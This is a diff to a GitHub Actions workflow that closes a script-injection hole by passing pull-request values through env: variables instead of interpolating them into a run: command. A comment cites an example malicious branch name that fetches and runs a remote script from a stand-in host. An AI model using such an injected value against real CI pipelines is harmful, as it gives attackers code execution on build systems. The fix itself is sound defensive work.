@@ -28,4 +28,15 @@ jobs:
           python-version: '3.12'
 
       - name: Check protected core + forbidden paths
-        run: python scripts/audit_guard.py "origin/${{ github.event.pull_request.base.ref }}" "${{ github.event.pull_request.head.sha }}" "${{ github.event.pull_request.user.login }}" "${{ github.head_ref }}"
+        # Untrusted PR-controlled values (github.head_ref is a branch name an
+        # attacker names; git ref names permit $, `, ( ) unlike GitHub logins)
+        # MUST go through env:, never be interpolated straight into `run:` --
+        # the latter is classic GitHub Actions script injection (a branch
+        # named `x$(curl evil|sh)` would execute inside the shell). env: vars
+        # are passed as inert data; the shell never re-parses their content.
+        env:
+          PR_BASE_REF: ${{ github.event.pull_request.base.ref }}
+          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          PR_ACTOR: ${{ github.event.pull_request.user.login }}
+          PR_HEAD_REF: ${{ github.head_ref }}
+        run: python scripts/audit_guard.py "origin/$PR_BASE_REF" "$PR_HEAD_SHA" "$PR_ACTOR" "$PR_HEAD_REF"
